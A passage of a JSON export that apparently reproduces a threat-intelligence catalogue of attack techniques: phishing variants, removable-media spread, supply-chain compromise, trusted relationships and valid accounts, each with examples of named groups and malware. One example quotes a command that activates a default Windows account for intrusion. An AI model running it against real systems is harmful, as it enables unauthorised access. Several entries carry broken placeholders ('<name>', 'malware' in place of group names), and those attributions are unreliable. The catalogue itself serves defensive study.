                        "Description": "<name> has sent spearphishing emails containing malicious links.[109][110][111][112]"
                    },
                    "G0134": {
                        "ID": "G0134",
                        "Name": "Transparent Tribe",
                        "Description": "<name> has embedded links to malicious downloads in e-mails.[113][114]"
                    },
                    "S0266": {
                        "ID": "S0266",
                        "Name": "TrickBot",
                        "Description": "<name> has been delivered via malicious links in phishing e-mails.[115]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> attempted to trick targets into clicking on a link featuring a seemingly legitimate domain from Adobe.com to download their malware and gain initial access.[116]"
                    },
                    "S0476": {
                        "ID": "S0476",
                        "Name": "Valak",
                        "Description": "<name> has been delivered via malicious links in e-mail.[117]"
                    },
                    "G0112": {
                        "ID": "G0112",
                        "Name": "Windshift",
                        "Description": "<name> has sent spearphishing emails with links to harvest credentials and deliver malware.[118]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has sent phishing emails containing a link to an actor-controlled Google Drive document or other free online file hosting services.[119][120]"
                    },
                    "G0128": {
                        "ID": "G0128",
                        "Name": "ZIRCONIUM",
                        "Description": "<name> has used malicious links in e-mails to deliver malware.[121][122][123]"
                    }
                }
            },
            "003": {
                "name": "Spearphishing via Service",
                "href": "/techniques/T1566/003",
                "description": "Adversaries may send spearphishing messages via third-party services in an attempt to gain access to victim systems. Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services.[1] These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.A common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.",
                "Procedure": {
                    "G0130": {
                        "ID": "G0130",
                        "Name": "Ajax Security Team",
                        "Description": "<name> has used various social media channels to spearphish victims.[2]"
                    },
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has used the legitimate mailing service Constant Contact to send phishing e-mails.[3]"
                    },
                    "G1012": {
                        "ID": "G1012",
                        "Name": "CURIUM",
                        "Description": "<name> has used social media to deliver malicious files to victims.[4]"
                    },
                    "G0070": {
                        "ID": "G0070",
                        "Name": "Dark Caracal",
                        "Description": "<name> spearphished victims via Facebook and Whatsapp.[1]"
                    },
                    "G1011": {
                        "ID": "G1011",
                        "Name": "EXOTIC LILY",
                        "Description": "<name> has used the e-mail notification features of legitimate file sharing services for spearphishing.[5]"
                    },
                    "G0037": {
                        "ID": "G0037",
                        "Name": "FIN6",
                        "Description": "<name> has used fake job advertisements sent via LinkedIn to spearphish targets.[6]"
                    },
                    "G0032": {
                        "ID": "G0032",
                        "Name": "Lazarus Group",
                        "Description": "<name> has used social media platforms, including LinkedIn and Twitter, to send spearphishing messages.[7]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> used various social media channels (such as LinkedIn) as well as messaging services (such as WhatsApp) to spearphish victims.[8][9][10]"
                    },
                    "S1100": {
                        "ID": "S1100",
                        "Name": "Ninja",
                        "Description": "<name> has been distributed to victims via the messaging app Telegram.[11]"
                    },
                    "G0049": {
                        "ID": "G0049",
                        "Name": "OilRig",
                        "Description": "<name> has used LinkedIn to send spearphishing links.[12]"
                    },
                    "C0022": {
                        "ID": "C0022",
                        "Name": "Operation Dream Job",
                        "Description": "During <name>, Lazarus Group sent victims spearphishing messages via LinkedIn concerning fictitious jobs.[13][14]"
                    },
                    "G1022": {
                        "ID": "G1022",
                        "Name": "ToddyCat",
                        "Description": "<name> has sent loaders configured to run Ninja as zip archives via Telegram.[11]"
                    },
                    "G0112": {
                        "ID": "G0112",
                        "Name": "Windshift",
                        "Description": "<name> has used fake personas on social media to engage and target victims.[15]"
                    }
                }
            },
            "004": {
                "name": "Spearphishing Voice",
                "href": "/techniques/T1566/004",
                "description": "Adversaries may use voice communications to ultimately gain access to victim systems. Spearphishing voice is a specific variant of spearphishing. It is different from other forms of spearphishing in that is employs the use of manipulating a user into providing access to systems through a phone call or other forms of voice communications. Spearphishing frequently involves social engineering techniques, such as posing as a trusted source (ex: Impersonation) and/or creating a sense of urgency or alarm for the recipient.All forms of phishing are electronically delivered social engineering. In this scenario, adversaries are not directly sending malware to a victim vice relying on User Execution for delivery and execution. For example, victims may receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,[1][2] or install adversary-accessible remote management tools (Remote Access Software) onto their computer.[3]Adversaries may also combine voice phishing with Multi-Factor Authentication Request Generation in order to trick users into divulging MFA credentials or accepting authentication prompts.[4]",
                "Procedure": {
                    "C0027": {
                        "ID": "C0027",
                        "Name": "C0027",
                        "Description": "During <name>, Scattered Spider impersonated legitimate IT personnel in phone calls to direct victims to download a remote monitoring and management (RMM) tool that would allow the adversary to remotely control their system.[5]"
                    }
                }
            }
        },
        "tactic": "Initial Access",
        "description": "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns.Adversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., Email Hiding Rules).[1][2] Another way to accomplish this is by forging or spoofing[3] the identity of the sender which can be used to fool both the human recipient as well as automated security tools.[4] Victims may also receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware,[5][6] or install adversary-accessible remote management tools onto their computer (i.e., User Execution).[7]",
        "Procedure": {
            "G0001": {
                "ID": "G0001",
                "Name": "Axiom",
                "Description": "malware has used spear phishing to initially compromise victims.[8][9]"
            },
            "G0115": {
                "ID": "G0115",
                "Name": "GOLD SOUTHFIELD",
                "Description": "malware has conducted malicious spam (malspam) campaigns to gain access to victim's machines.[10]"
            },
            "S0009": {
                "ID": "S0009",
                "Name": "Hikit",
                "Description": "malware has been spread through spear phishing.[9]"
            },
            "S1073": {
                "ID": "S1073",
                "Name": "Royal",
                "Description": "malware has been spread through the use of phishing campaigns including \"call back phishing\" where victims are lured into calling a number provided through email.[11][12][13]"
            }
        }
    },
    "T1091": {
        "ttp_name": "Replication Through Removable Media",
        "ttp_id": "T1091",
        "href": "/techniques/T1091",
        "tactic": "Lateral Movement",
        "description": "Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself.Mobile devices may also be used to infect PCs with malware if connected via USB.[1] This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables.[2][3] For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled).",
        "Procedure": {
            "S0092": {
                "ID": "S0092",
                "Name": "Agent.btz",
                "Description": "malware drops itself onto removable media devices and creates an autorun.inf file with an instruction to run that file. When the device is inserted into another system, it opens autorun.inf and loads the malware.[4]"
            },
            "S1074": {
                "ID": "S1074",
                "Name": "ANDROMEDA",
                "Description": "malware has been spread via infected USB keys.[5]"
            },
            "G1007": {
                "ID": "G1007",
                "Name": "Aoqin Dragon",
                "Description": "malware has used a dropper that employs a worm infection strategy using a removable device to breach a secure network environment.[6]"
            },
            "G0007": {
                "ID": "G0007",
                "Name": "APT28",
                "Description": "malware uses a tool to infect connected USB devices and transmit itself to air-gapped computers when the infected USB device is inserted.[7]"
            },
            "S0023": {
                "ID": "S0023",
                "Name": "CHOPSTICK",
                "Description": "Part of APT28's operation involved using malware modules to copy itself to air-gapped machines and using files written to USB sticks to transfer data and command traffic.[8][7][9]"
            },
            "S0608": {
                "ID": "S0608",
                "Name": "Conficker",
                "Description": "malware variants used the Windows AUTORUN feature to spread through USB propagation.[10][11]"
            },
            "S0115": {
                "ID": "S0115",
                "Name": "Crimson",
                "Description": "malware can spread across systems by infecting removable media.[12]"
            },
            "G0012": {
                "ID": "G0012",
                "Name": "Darkhotel",
                "Description": "malware's selective infector modifies executables stored on removable media as a method of spreading across computers.[13]"
            },
            "S0062": {
                "ID": "S0062",
                "Name": "DustySky",
                "Description": "malware searches for removable media and duplicates itself onto it.[14]"
            },
            "G0046": {
                "ID": "G0046",
                "Name": "FIN7",
                "Description": "malware actors have mailed USB drives to potential victims containing malware that downloads and installs various backdoors, including in some cases for ransomware operations.[15]"
            },
            "S0143": {
                "ID": "S0143",
                "Name": "Flame",
                "Description": "malware contains modules to infect USB sticks and spread laterally to other Windows systems the stick is plugged into using Autorun functionality.[16]"
            },
            "S0132": {
                "ID": "S0132",
                "Name": "H1N1",
                "Description": "malware has functionality to copy itself to removable media.[17]"
            },
            "G1014": {
                "ID": "G1014",
                "Name": "LuminousMoth",
                "Description": "malware has used malicious DLLs to spread malware to connected removable USB drives on infected machines.[18][19]"
            },
            "G0129": {
                "ID": "G0129",
                "Name": "Mustang Panda",
                "Description": "malware has used a customized PlugX variant which could spread through USB connections.[20]"
            },
            "S0385": {
                "ID": "S0385",
                "Name": "njRAT",
                "Description": "malware can be configured to spread via removable drives.[21][22]"
            },
            "S0650": {
                "ID": "S0650",
                "Name": "QakBot",
                "Description": "malware has the ability to use removable drives to spread through compromised networks.[23]"
            },
            "S0458": {
                "ID": "S0458",
                "Name": "Ramsay",
                "Description": "malware can spread itself by infecting other portable executable files on removable drives.[24]"
            },
            "S0028": {
                "ID": "S0028",
                "Name": "SHIPSHAPE",
                "Description": "APT30 may have used the malware malware to move onto air-gapped networks. malware targets removable drives to spread to other systems by modifying the drive to use Autorun to execute or by hiding legitimate document files and copying an executable to the folder with the same name as the legitimate document.[25]"
            },
            "S0603": {
                "ID": "S0603",
                "Name": "Stuxnet",
                "Description": "malware can propagate via removable media using an autorun.inf file or the CVE-2010-2568 LNK vulnerability.[26]"
            },
            "G0081": {
                "ID": "G0081",
                "Name": "Tropic Trooper",
                "Description": "malware has attempted to transfer USBferry from an infected USB device by copying an Autorun function to the target machine.[27]"
            },
            "S0130": {
                "ID": "S0130",
                "Name": "Unknown Logger",
                "Description": "malware is capable of spreading to USB devices.[28]"
            },
            "S0386": {
                "ID": "S0386",
                "Name": "Ursnif",
                "Description": "malware has copied itself to and infected removable drives for propagation.[29][30]"
            },
            "S0452": {
                "ID": "S0452",
                "Name": "USBferry",
                "Description": "malware can copy its installer to attached USB storage devices.[27]"
            },
            "S0136": {
                "ID": "S0136",
                "Name": "USBStealer",
                "Description": "malware drops itself onto removable media and relies on Autorun to execute the malicious file when a user opens the removable media on another system.[31]"
            }
        }
    },
    "T1195": {
        "ttp_name": "Supply Chain Compromise",
        "ttp_id": "T1195",
        "href": "/techniques/T1195",
        "subtechnique": {
            "001": {
                "name": "Compromise Software Dependencies and Development Tools",
                "href": "/techniques/T1195/001",
                "description": "Adversaries may manipulate software dependencies and development tools prior to receipt by a final consumer for the purpose of data or system compromise. Applications often depend on external software to function properly. Popular open source projects that are used as dependencies in many applications may be targeted as a means to add malicious code to users of the dependency.[1] Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.",
                "Procedure": {
                    "S0658": {
                        "ID": "S0658",
                        "Name": "XCSSET",
                        "Description": "<name> adds malicious code to a host's Xcode projects by enumerating CocoaPods target_integrator.rb files under the /Library/Ruby/Gems folder or enumerates all .xcodeproj folders under a given directory. <name> then downloads a script and Mach-O file into the Xcode project folder.[2]"
                    }
                }
            },
            "002": {
                "name": "Compromise Software Supply Chain",
                "href": "/techniques/T1195/002",
                "description": "Adversaries may manipulate application software prior to receipt by a final consumer for the purpose of data or system compromise. Supply chain compromise of software can take place in a number of ways, including manipulation of the application source code, manipulation of the update/distribution mechanism for that software, or replacing compiled releases with a modified version.Targeting may be specific to a desired victim set or may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.[1][2]",
                "Procedure": {
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> gained access to production environments where they could inject malicious code into legitimate, signed files and widely distribute them to end users.[3]"
                    },
                    "S0222": {
                        "ID": "S0222",
                        "Name": "CCBkdr",
                        "Description": "<name> was added to a legitimate, signed version 5.33 of the CCleaner software and distributed on CCleaner's distribution site.[4][5][1]"
                    },
                    "G0080": {
                        "ID": "G0080",
                        "Name": "Cobalt Group",
                        "Description": "<name> has compromised legitimate web browser updates to deliver a backdoor. [6]"
                    },
                    "G0035": {
                        "ID": "G0035",
                        "Name": "Dragonfly",
                        "Description": "<name> has placed trojanized installers for control system software on legitimate vendor app stores.[7][8]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> has gained initial access by compromising a victim's software supply chain.[9]"
                    },
                    "G0115": {
                        "ID": "G0115",
                        "Name": "GOLD SOUTHFIELD",
                        "Description": "<name> has distributed ransomware by backdooring software installers via a strategic web compromise of the site hosting Italian WinRAR.[10][11][12]"
                    },
                    "S0493": {
                        "ID": "S0493",
                        "Name": "GoldenSpy",
                        "Description": "<name> has been packaged with a legitimate tax preparation software.[13]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> has distributed NotPetya by compromising the legitimate Ukrainian accounting software M.E.Doc and replacing a legitimate software update with a malicious one.[14][15][16]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 gained initial network access to some victims via a trojanized update of SolarWinds Orion software.[17][18][19][20]"
                    },
                    "S0562": {
                        "ID": "S0562",
                        "Name": "SUNSPOT",
                        "Description": "<name> malware was designed and used to insert SUNBURST into software builds of the SolarWinds Orion IT management product.[21]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "<name> has compromised the Able Desktop installer to gain access to victim's environments.[22]"
                    }
                }
            },
            "003": {
                "name": "Compromise Hardware Supply Chain",
                "href": "/techniques/T1195/003",
                "description": "Adversaries may manipulate hardware components in products prior to receipt by a final consumer for the purpose of data or system compromise. By modifying hardware or firmware in the supply chain, adversaries can insert a backdoor into consumer networks that may be difficult to detect and give the adversary a high degree of control over the system. Hardware backdoors may be inserted into various devices, such as servers, workstations, network infrastructure, or peripherals.",
                "Procedure": {}
            }
        },
        "tactic": "Initial Access",
        "description": "Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise.Supply chain compromise can take place at any stage of the supply chain including:Manipulation of development toolsManipulation of a development environmentManipulation of source code repositories (public or private)Manipulation of source code in open-source dependenciesManipulation of software update/distribution mechanismsCompromised/infected system images (multiple cases of removable media infected at the factory)[1][2] Replacement of legitimate software with modified versionsSales of modified/counterfeit products to legitimate distributorsShipment interdictionWhile supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels.[3][4][5] Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims.[6][3][5] Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency.[7]",
        "Procedure": {}
    },
    "T1199": {
        "ttp_name": "Trusted Relationship",
        "ttp_id": "T1199",
        "href": "/techniques/T1199",
        "tactic": "Initial Access",
        "description": "Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.Organizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, Valid Accounts used by the other party for access to internal network systems may be compromised and used.[1]In Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.[2]",
        "Procedure": {
            "G0007": {
                "ID": "G0007",
                "Name": "APT28",
                "Description": "Once malware gained access to the DCCC network, the group then proceeded to use that access to compromise the DNC network.[3]"
            },
            "G0016": {
                "ID": "G0016",
                "Name": "APT29",
                "Description": "malware has compromised IT, cloud services, and managed services providers to gain broad access to multiple customers for subsequent operations.[4]"
            },
            "G0115": {
                "ID": "G0115",
                "Name": "GOLD SOUTHFIELD",
                "Description": "malware has breached Managed Service Providers (MSP's) to deliver malware to MSP customers.[5]"
            },
            "G1004": {
                "ID": "G1004",
                "Name": "LAPSUS$",
                "Description": "malware has accessed internet-facing identity providers such as Azure Active Directory and Okta to target specific organizations.[6]"
            },
            "G0045": {
                "ID": "G0045",
                "Name": "menuPass",
                "Description": "malware has used legitimate access granted to Managed Service Providers in order to access victims of interest.[7][8][9][10][11]"
            },
            "G1005": {
                "ID": "G1005",
                "Name": "POLONIUM",
                "Description": "malware has used compromised credentials from an IT company to target downstream customers including a law firm and aviation company.[12]"
            },
            "G0034": {
                "ID": "G0034",
                "Name": "Sandworm Team",
                "Description": "malware has used dedicated network connections from one victim organization to gain unauthorized access to a separate organization.[13]"
            },
            "C0024": {
                "ID": "C0024",
                "Name": "SolarWinds Compromise",
                "Description": "During the malware, APT29 gained access through compromised accounts at cloud solution partners, and used compromised certificates issued by Mimecast to authenticate to Mimecast customer systems.[14][15]"
            },
            "G0027": {
                "ID": "G0027",
                "Name": "Threat Group-3390",
                "Description": "malware has compromised third party service providers to gain access to victim's environments.[16]"
            }
        }
    },
    "T1078": {
        "ttp_name": "Valid Accounts",
        "ttp_id": "T1078",
        "href": "/techniques/T1078",
        "subtechnique": {
            "001": {
                "name": "Default Accounts",
                "href": "/techniques/T1078/001",
                "description": "Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS and the default service account in Kubernetes.[1][2][3]Default accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen Private Keys or credential materials to legitimately connect to remote environments via Remote Services.[4]",
                "Procedure": {
                    "G1016": {
                        "ID": "G1016",
                        "Name": "FIN13",
                        "Description": "<name> has leveraged default credentials for authenticating myWebMethods (WMS) and QLogic web management interface to gain initial access.[5]"
                    },
                    "S0537": {
                        "ID": "S0537",
                        "Name": "HyperStack",
                        "Description": "<name> can use default credentials to connect to IPC$ shares on remote machines.[6]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> enabled and used the default system managed account, DefaultAccount, via \"powershell.exe\" /c net user DefaultAccount /active:yes to connect to a targeted Exchange server over RDP.[7]"
                    },
                    "S0603": {
                        "ID": "S0603",
                        "Name": "Stuxnet",
                        "Description": "<name> infected WinCC machines via a hardcoded database server password.[8]"
                    }
                }
            },
            "002": {
                "name": "Domain Accounts",
                "href": "/techniques/T1078/002",
                "description": "Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.[1] Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.[2]Adversaries may compromise domain accounts, some with a high level of privileges, through various means such as OS Credential Dumping or password reuse, allowing access to privileged resources of the domain.",
                "Procedure": {
                    "G0022": {
                        "ID": "G0022",
                        "Name": "APT3",
                        "Description": "<name> leverages valid accounts after gaining credentials for use within the victim domain.[3]"
                    },
                    "G1023": {
                        "ID": "G1023",
                        "Name": "APT5",
                        "Description": "<name> has used legitimate account credentials to move laterally through compromised environments.[4]"
                    },
                    "G0114": {
                        "ID": "G0114",
                        "Name": "Chimera",
                        "Description": "<name> has used compromised domain accounts to gain access to the target environment.[5]"
                    },
                    "G1021": {
                        "ID": "G1021",
                        "Name": "Cinnamon Tempest",
                        "Description": "<name> has obtained highly privileged credentials such as domain administrator in order to deploy malware.[6]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can use known credentials to run commands and spawn processes as a domain user account.[7][8][9]"
                    },
                    "S1024": {
                        "ID": "S1024",
                        "Name": "CreepySnail",
                        "Description": "<name> can use stolen credentials to authenticate on target networks.[10]"
                    },
                    "C0029": {
                        "ID": "C0029",
                        "Name": "Cutting Edge",
                        "Description": "During <name>, threat actors used compromised VPN accounts for lateral movement on targeted networks.[11]"
                    },
                    "G0119": {
                        "ID": "G0119",
                        "Name": "Indrik Spider",
                        "Description": "<name> has collected credentials from infected systems, including domain accounts.[12]"
                    },
                    "G0059": {
                        "ID": "G0059",
                        "Name": "Magic Hound",
                        "Description": "<name> has used domain administrator accounts after dumping LSASS process memory.[13]"
                    },
                    "G0019": {
                        "ID": "G0019",
                        "Name": "Naikon",
                        "Description": "<name> has used administrator credentials for lateral movement in compromised networks.[14]"
                    },
                    "C0002": {
                        "ID": "C0002",
                        "Name": "Night Dragon",
                        "Description": "During <name>, threat actors used domain accounts to gain further access to victim systems.[15]"
                    },
                    "C0012": {
                        "ID": "C0012",
                        "Name": "Operation CuckooBees",
                        "Description": "During <name>, the threat actors used compromised domain administrator credentials as part of their lateral movement.[16]"
                    },
                    "C0023": {
                        "ID": "C0023",
                        "Name": "Operation Ghost",
                        "Description": "For <name>, APT29 used stolen administrator credentials for lateral movement on compromised networks.[17]"
                    },
                    "C0014": {
                        "ID": "C0014",
                        "Name": "Operation Wocao",
                        "Description": "During <name>, threat actors used domain credentials, including domain admin, for lateral movement and privilege escalation.[18]"
                    },
                    "S0446": {
                        "ID": "S0446",
                        "Name": "Ryuk",
                        "Description": "<name> can use stolen domain admin accounts to move laterally within a victim domain.[19]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> has used stolen credentials to access administrative accounts within the domain.[20][21]"
                    },
                    "S0140": {
                        "ID": "S0140",
                        "Name": "Shamoon",
                        "Description": "If <name> cannot access shares using current privileges, it attempts access using hard coded, domain-specific credentials gathered earlier in the intrusion.[22][23]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 used domain administrators' accounts to help facilitate lateral movement on compromised networks.[24]"
                    },
                    "S0603": {
                        "ID": "S0603",
                        "Name": "Stuxnet",
                        "Description": "<name> attempts to access network resources with a domain account\u2019s credentials.[25]"
                    },
                    "G0092": {
                        "ID": "G0092",
                        "Name": "TA505",
                        "Description": "<name> has used stolen domain admin accounts to compromise additional hosts.[26]"
                    },
                    "G0028": {
                        "ID": "G0028",
                        "Name": "Threat Group-1314",
                        "Description": "<name> actors used compromised domain credentials for the victim's endpoint management platform, Altiris, to move laterally.[27]"
                    },
                    "G1022": {
                        "ID": "G1022",
                        "Name": "ToddyCat",
                        "Description": "<name> has used compromised domain admin credentials to mount local network shares.[28]"
                    },
                    "G1017": {
                        "ID": "G1017",
                        "Name": "Volt Typhoon",
                        "Description": "<name> has used compromised domain accounts to authenticate to devices on compromised networks.[29][30]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has used administrative accounts, including Domain Admin, to move laterally within a victim network.[31]"
                    }
                }
            },
            "003": {
                "name": "Local Accounts",
                "href": "/techniques/T1078/003",
                "description": "Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.Local Accounts may also be abused to elevate privileges and harvest credentials through OS Credential Dumping. Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.",
                "Procedure": {
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> targets dormant or inactive user accounts, accounts belonging to individuals no longer at the organization but whose accounts remain on the system, for access and persistence.[1]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> has used legitimate local admin account credentials.[2]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> can use known credentials to run commands and spawn processes as a local user account.[3][4]"
                    },
                    "S0367": {
                        "ID": "S0367",
                        "Name": "Emotet",
                        "Description": "<name> can brute force a local admin password, then use it to facilitate lateral movement.[5]"
                    },
                    "G0051": {
                        "ID": "G0051",
                        "Name": "FIN10",
                        "Description": "<name> has moved laterally using the Local Administrator account.[6]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> has used compromised credentials for access as SYSTEM on Exchange servers.[7]"
                    },
                    "G0125": {
                        "ID": "G0125",
                        "Name": "HAFNIUM",
                        "Description": "<name> has used the NT AUTHORITY\\SYSTEM account to create files on Exchange servers.[8]"
                    },
                    "G0094": {
                        "ID": "G0094",
                        "Name": "Kimsuky",
                        "Description": "<name> has used a tool called GREASE to add a Windows admin account in order to allow them continued access via RDP.[9]"
                    },
                    "S0368": {
                        "ID": "S0368",
                        "Name": "NotPetya",
                        "Description": "<name> can use valid credentials with PsExec or wmic to spread itself to remote systems.[10][11]"
                    },
                    "C0014": {
                        "ID": "C0014",
                        "Name": "Operation Wocao",
                        "Description": "During <name>, threat actors used local account credentials found during the intrusion for lateral movement and privilege escalation.[12]"
                    },
                    "G0056": {
                        "ID": "G0056",
                        "Name": "PROMETHIUM",
                        "Description": "<name> has created admin accounts on a compromised host.[13]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 used compromised local accounts to access victims' networks.[14]"
                    },
                    "G0081": {
                        "ID": "G0081",
                        "Name": "Tropic Trooper",
                        "Description": "<name> has used known administrator account credentials to execute the backdoor directly.[15]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> has abused local accounts that have the same password across the victim\u2019s network.[16]"
                    },
                    "S0221": {
                        "ID": "S0221",
                        "Name": "Umbreon",
                        "Description": "<name> creates valid local users to provide access to the system.[17]"
                    }
                }
            },
            "004": {
                "name": "Cloud Accounts",
                "href": "/techniques/T1078/004",
                "description": "Valid accounts in cloud environments may allow adversaries to perform actions to achieve Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Cloud accounts are those created and configured by an organization for use by users, remote support, services, or for administration of resources within a cloud service provider or SaaS application. Cloud Accounts can exist solely in the cloud; alternatively, they may be hybrid-joined between on-premises systems and the cloud through syncing or federation with other identity sources such as Windows Active Directory. [1][2][3]Service or user accounts may be targeted by adversaries through Brute Force, Phishing, or various other means to gain access to the environment. Federated or synced accounts may be a pathway for the adversary to affect both on-premises systems and cloud environments - for example, by leveraging shared credentials to log onto Remote Services. High privileged cloud accounts, whether federated, synced, or cloud-only, may also allow pivoting to on-premises environments by leveraging SaaS-based Software Deployment Tools to run commands on hybrid-joined devices.An adversary may create long lasting Additional Cloud Credentials on a compromised cloud account to maintain persistence in the environment. Such credentials may also be used to bypass security controls such as multi-factor authentication. Cloud accounts may also be able to assume Temporary Elevated Cloud Access or other privileges through various means within the environment. Misconfigurations in role assignments or role assumption policies may allow an adversary to use these mechanisms to leverage permissions outside the intended scope of the account. Such over privileged accounts may be used to harvest sensitive data from online storage accounts and databases through Cloud API or other methods.",
                "Procedure": {
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "<name> has used compromised Office 365 service accounts with Global Administrator privileges to collect email from user inboxes.[4]"
                    },
                    "G0016": {
                        "ID": "G0016",
                        "Name": "APT29",
                        "Description": "<name> has gained access to a global administrator account in Azure AD and has used Service Principal credentials in Exchange.[5][6]"
                    },
                    "G0064": {
                        "ID": "G0064",
                        "Name": "APT33",
                        "Description": "<name> has used compromised Office 365 accounts in tandem with Ruler in an attempt to gain control of endpoints.[7]"
                    },
                    "G1023": {
                        "ID": "G1023",
                        "Name": "APT5",
                        "Description": "<name> has accessed Microsoft M365 cloud environments using stolen credentials. [8]"
                    },
                    "C0027": {
                        "ID": "C0027",
                        "Name": "C0027",
                        "Description": "During <name>, Scattered Spider leveraged compromised credentials from victim users  to authenticate to Azure tenants.[9]"
                    },
                    "G0004": {
                        "ID": "G0004",
                        "Name": "Ke3chang",
                        "Description": "<name> has used compromised credentials to sign into victims\u2019 Microsoft 365 accounts.[10]"
                    },
                    "G1004": {
                        "ID": "G1004",
                        "Name": "LAPSUS$",
                        "Description": "<name> has used compromised credentials to access cloud assets within a target organization.[11]"
                    },
                    "S1091": {
                        "ID": "S1091",
                        "Name": "Pacu",
                        "Description": "<name> leverages valid cloud accounts to perform most of its operations.[12]"
                    },
                    "S0683": {
                        "ID": "S0683",
                        "Name": "Peirates",
